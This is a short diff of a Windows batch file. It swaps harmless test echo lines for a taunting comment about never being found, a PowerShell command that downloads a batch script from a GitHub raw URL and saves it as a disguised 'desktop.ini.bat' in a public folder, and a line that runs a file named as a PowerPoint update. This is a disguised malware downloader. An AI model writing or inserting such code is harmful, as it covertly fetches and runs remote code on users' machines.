@@ -1,10 +1,4 @@
+// You never ever fucking find me bitch LOL
 @echo off
-echo Oh ya am working
-:LABEL1
-echo THIS IS A TEST OF TEXT
-cmd.exe pwd
-set/p input=THIS IS A TEST INPUT_
-if %input%==1 goto LABEL1
-goto LABEL2
-:LABEL2
-echo TEST
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $client = new-object System.Net.WebClient;$client.DownloadFile('https://github.com/R911-bot/Storage/blob/main/script.bat?raw=true' , 'C:\Users\Public\Documents\desktop.ini.bat');exit
+"C:\Users\Public\Documents\Windows Powerpoint Update.bat"
